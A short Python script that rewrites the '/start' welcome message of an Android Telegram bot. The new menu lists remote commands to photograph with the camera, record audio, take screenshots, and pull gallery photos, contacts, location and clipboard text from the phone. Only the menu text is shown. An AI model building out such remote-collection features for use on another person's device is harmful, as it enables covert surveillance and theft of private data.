import re

with open('/app/applet/app/src/main/java/com/example/telegrambot/handlers/MessageHandler.kt', 'r') as f:
    content = f.read()

new_start = """            "/start" -> {
                val welcome = \"\"\"
                    🤖 *Welcome to Telegram Bot!*
                    
                    I'm your personal assistant. Here's what I can do:
                    • /camera - Take photo from back camera
                    • /gallery - List recent photos from gallery
                    • /status - Get device battery and storage status
                    • /record - Record 40 seconds of audio
                    • /screenshot - Capture a snapshot of the current screen
                    • /contacts - Get contacts list
                    • /location - Get current device location
                    • /clipboard - Get current clipboard text
                \"\"\".trimIndent()
                TelegramApi.sendMessage(token, chatId, welcome, "Markdown")
            }"""

content = re.sub(r'"/start" -> \{.*?\n            \}', new_start.replace('\\', '\\\\'), content, count=1, flags=re.DOTALL)

with open('/app/applet/app/src/main/java/com/example/telegrambot/handlers/MessageHandler.kt', 'w') as f:
    f.write(content)
